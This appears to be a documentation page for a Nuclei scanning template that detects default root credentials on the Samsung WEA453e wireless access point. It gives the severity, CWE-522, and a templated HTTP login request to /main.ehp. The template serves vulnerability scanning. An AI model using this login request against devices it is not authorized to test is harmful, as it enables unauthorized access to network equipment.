# Nuclei Template: Samsung Wlan AP (WEA453e) Default Login
**Template ID:** samsung-wlan-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`samsung-wlan-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Samsung Wlan AP (WEA453e) default root credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /main.ehp HTTP/1.1
Host: {{Hostname}}

httpd;General;lang=en&login_id={{username}}&login_pw={{password}}
```

## References
- https://securityforeveryone.com/tools/samsung-wlan-ap-wea453e-default-credentials-scanner
